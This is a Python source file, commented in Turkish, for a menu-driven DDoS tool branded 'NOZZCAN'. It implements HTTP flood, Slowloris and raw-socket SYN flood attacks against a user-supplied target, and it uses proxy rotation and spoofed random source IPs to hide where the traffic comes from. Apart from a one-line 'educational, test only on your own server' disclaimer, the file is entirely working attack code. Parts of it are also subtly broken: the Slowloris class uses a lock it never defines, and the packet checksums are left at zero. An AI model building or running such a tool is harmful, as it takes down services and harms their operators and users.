#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DDoS TOOL - EĞİTİM AMAÇLI
HTTP Flood, SYN Flood, Slowloris
SADECE KENDİ SUNUCUNDA TEST ET!
"""

import sys
import time
import random
import socket
import threading
import requests
from urllib.parse import urlparse
from colorama import init, Fore, Style
from tqdm import tqdm
import logging

init(autoreset=True)

# -------------------------- LOG --------------------------
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("DDoS")

# -------------------------- RENKLER --------------------------
def cprint(text, color=Fore.CYAN, bold=False):
    if bold:
        print(f"{Style.BRIGHT}{color}{text}{Style.RESET_ALL}")
    else:
        print(f"{color}{text}{Style.RESET_ALL}")

# -------------------------- CONFIG --------------------------
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
]

PROXIES = []  # Opsiyonel: proxies.txt dosyasından yükle

def load_proxies():
    global PROXIES
    try:
        with open('proxies.txt', 'r') as f:
            PROXIES = [line.strip() for line in f if line.strip()]
        cprint(f"[+] {len(PROXIES)} proxy yüklendi.", Fore.GREEN)
    except:
        pass

def random_ua():
    return random.choice(USER_AGENTS)

def random_proxy():
    return {'http': random.choice(PROXIES), 'https': random.choice(PROXIES)} if PROXIES else None

# -------------------------- HTTP FLOOD --------------------------
class HTTPFlood:
    def __init__(self, target_url, threads=100, duration=60, use_proxy=False):
        self.url = target_url
        self.threads = threads
        self.duration = duration
        self.use_proxy = use_proxy
        self.running = True
        self.success = 0
        self.fail = 0
        self.lock = threading.Lock()

    def attack(self):
        cprint(f"[*] HTTP Flood başlıyor: {self.url}", Fore.YELLOW)
        cprint(f"[*] Thread: {self.threads}, Süre: {self.duration}s", Fore.YELLOW)
        
        for i in range(self.threads):
            t = threading.Thread(target=self._worker)
            t.daemon = True
            t.start()
        
        time.sleep(self.duration)
        self.running = False
        cprint(f"\n[+] HTTP Flood bitti. Başarılı: {self.success}, Başarısız: {self.fail}", Fore.GREEN)

    def _worker(self):
        while self.running:
            try:
                method = random.choice(['GET', 'POST'])
                headers = {
                    'User-Agent': random_ua(),
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache'
                }
                proxies = random_proxy() if self.use_proxy else None
                
                if method == 'GET':
                    r = requests.get(self.url, headers=headers, proxies=proxies, timeout=5)
                else:
                    r = requests.post(self.url, headers=headers, data={'data': random.randint(1, 1000)}, proxies=proxies, timeout=5)
                
                with self.lock:
                    if r.status_code < 400:
                        self.success += 1
                    else:
                        self.fail += 1
            except:
                with self.lock:
                    self.fail += 1

# -------------------------- SLOWLORIS --------------------------
class Slowloris:
    def __init__(self, target_ip, port=80, threads=200, duration=60):
        self.target = target_ip
        self.port = port
        self.threads = threads
        self.duration = duration
        self.running = True
        self.connections = 0

    def attack(self):
        cprint(f"[*] Slowloris başlıyor: {self.target}:{self.port}", Fore.YELLOW)
        cprint(f"[*] Thread: {self.threads}, Süre: {self.duration}s", Fore.YELLOW)
        
        for i in range(self.threads):
            t = threading.Thread(target=self._worker)
            t.daemon = True
            t.start()
        
        time.sleep(self.duration)
        self.running = False
        cprint(f"[+] Slowloris bitti. {self.connections} bağlantı açıldı.", Fore.GREEN)

    def _worker(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.target, self.port))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                s.send(f"User-Agent: {random_ua()}\r\n".encode())
                s.send(f"Accept: */*\r\n".encode())
                s.send(f"Connection: keep-alive\r\n".encode())
                s.send(f"Content-Length: {random.randint(1, 1000)}\r\n".encode())
                s.send(f"Host: {self.target}\r\n".encode())
                s.send(f"X-Custom: {random.randint(1, 9999)}\r\n".encode())
                # Bağlantıyı açık tut, veri gönderme
                with self.lock:
                    self.connections += 1
                time.sleep(random.uniform(1, 10))
                s.close()
            except:
                pass

# -------------------------- SYN FLOOD (Linux root) --------------------------
class SYNFlood:
    def __init__(self, target_ip, port=80, threads=200, duration=30):
        self.target = target_ip
        self.port = port
        self.threads = threads
        self.duration = duration
        self.running = True

    def attack(self):
        if not sys.platform.startswith('linux'):
            cprint("[!] SYN Flood sadece Linux'ta çalışır (root gerekli).", Fore.RED)
            return
        
        cprint(f"[*] SYN Flood başlıyor: {self.target}:{self.port}", Fore.YELLOW)
        cprint(f"[*] Thread: {self.threads}, Süre: {self.duration}s", Fore.YELLOW)
        
        try:
            import fcntl
        except:
            cprint("[!] SYN Flood için yeterli izin yok. Root olarak çalıştır.", Fore.RED)
            return
        
        for i in range(self.threads):
            t = threading.Thread(target=self._worker)
            t.daemon = True
            t.start()
        
        time.sleep(self.duration)
        self.running = False
        cprint("[+] SYN Flood bitti.", Fore.GREEN)

    def _worker(self):
        # Raw socket oluştur
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            while self.running:
                # Rastgele SYN paketi oluştur (basit)
                packet = self._create_syn_packet()
                s.sendto(packet, (self.target, self.port))
                time.sleep(0.001)
            s.close()
        except PermissionError:
            cprint("[!] Root yetkisi gerekli!", Fore.RED)
            sys.exit()
        except:
            pass

    def _create_syn_packet(self):
        # Basit SYN paketi (IPv4 + TCP)
        # Kaynak IP rastgele
        src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        src_port = random.randint(1024, 65535)
        
        # IP header (20 bytes)
        ip_header = bytes([
            0x45, 0x00, 0x00, 0x28,  # Version, IHL, TOS, Total Length
            0x00, 0x00, 0x40, 0x00,  # ID, Flags, Fragment Offset
            0x40, 0x06, 0x00, 0x00,  # TTL, Protocol (TCP), Checksum (0)
            *[int(x) for x in src_ip.split('.')],  # Source IP
            *[int(x) for x in self.target.split('.')]  # Dest IP
        ])
        
        # TCP header (20 bytes)
        tcp_header = bytes([
            src_port >> 8, src_port & 0xFF,  # Source Port
            self.port >> 8, self.port & 0xFF,  # Dest Port
            0x00, 0x00, 0x00, 0x00,  # Seq Number
            0x00, 0x00, 0x00, 0x00,  # Ack Number
            0x50, 0x02, 0x00, 0x00,  # Header Length, Flags (SYN), Window
            0x00, 0x00, 0x00, 0x00   # Checksum, Urgent
        ])
        
        return ip_header + tcp_header

# -------------------------- MENÜ --------------------------
def main():
    print()
    cprint("""
    ╔═══════════════════════════════════════╗
    ║  ██████╗ ██████╗  ███████╗          ║
    ║  ██╔══██╗██╔══██╗██╔════╝          ║
    ║  ██║  ██║██████╔╝███████╗          ║
    ║  ██║  ██║██╔══██╗╚════██║          ║
    ║  ██████╔╝██║  ██║███████║          ║
    ║  ╚═════╝ ╚═╝  ╚═╝╚══════╝          ║
    ║       DDoS TOOL - NOZZCAN           ║
    ╚═══════════════════════════════════════╝
    """, Fore.MAGENTA, bold=True)
    
    cprint("[1] HTTP Flood (Layer 7)", Fore.CYAN)
    cprint("[2] Slowloris (Layer 7)", Fore.CYAN)
    cprint("[3] SYN Flood (Layer 4 - Linux root)", Fore.CYAN)
    cprint("[0] Çıkış", Fore.RED)
    print()
    
    try:
        choice = input("Seçiminiz: ").strip()
        if choice == '0':
            cprint("Hoşçakal.", Fore.GREEN)
            sys.exit()
        
        target = input("Hedef (IP veya URL): ").strip()
        if not target:
            cprint("[!] Hedef boş olamaz!", Fore.RED)
            return
        
        try:
            threads = int(input("Thread sayısı (örn: 200): ").strip() or "200")
            duration = int(input("Süre (saniye): ").strip() or "30")
        except:
            threads = 200
            duration = 30
        
        load_proxies()
        
        if choice == '1':
            if not target.startswith('http'):
                target = 'http://' + target
            use_proxy = input("Proxy kullan? (e/h): ").lower() == 'e'
            flood = HTTPFlood(target, threads, duration, use_proxy)
            flood.attack()
        
        elif choice == '2':
            parsed = urlparse(target)
            host = parsed.hostname or target
            port = parsed.port or 80
            slow = Slowloris(host, port, threads, duration)
            slow.attack()
        
        elif choice == '3':
            parsed = urlparse(target)
            host = parsed.hostname or target
            port = parsed.port or 80
            syn = SYNFlood(host, port, threads, duration)
            syn.attack()
        
        else:
            cprint("[!] Geçersiz seçim!", Fore.RED)
    
    except KeyboardInterrupt:
        cprint("\n[!] Durduruldu.", Fore.RED)
    except Exception as e:
        cprint(f"[!] Hata: {e}", Fore.RED)
    
    input("\nDevam etmek için Enter'a bas...")

if __name__ == "__main__":
    while True:
        main()
